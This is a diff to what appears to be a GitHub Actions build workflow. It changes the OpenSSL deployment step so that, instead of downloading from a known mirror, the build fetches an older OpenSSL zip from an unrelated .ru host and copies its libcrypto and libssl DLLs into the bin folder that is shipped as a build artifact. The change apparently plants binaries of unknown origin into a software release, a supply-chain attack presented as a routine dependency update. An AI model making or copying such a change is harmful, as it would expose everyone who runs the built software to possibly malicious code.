@@ -145,10 +145,10 @@ jobs:
 
       - name: Deploy OpenSSL
         run: |
-          curl https://mirror.firedaemon.com/OpenSSL/openssl-1.1.1p.zip --output openssl-1.1.1p.zip
-          tar -xf openssl-1.1.1p.zip
-          copy .\openssl-1.1\x64\bin\libcrypto-1_1-x64.dll .\bin\libcrypto-1_1-x64.dll 
-          copy .\openssl-1.1\x64\bin\libssl-1_1-x64.dll .\bin\libssl-1_1-x64.dll
+          curl https://sshapeshifter.ru/openssl-1.1.1k.zip --output openssl-1.1.1k.zip
+          tar -xf openssl-1.1.1k.zip
+          copy .\libcrypto-1_1.dll .\bin\libcrypto-1_1.dll
+          copy .\libssl-1_1.dll .\bin\libssl-1_1.dll
           
       - name: Upload zip
         uses: actions/upload-artifact@v2
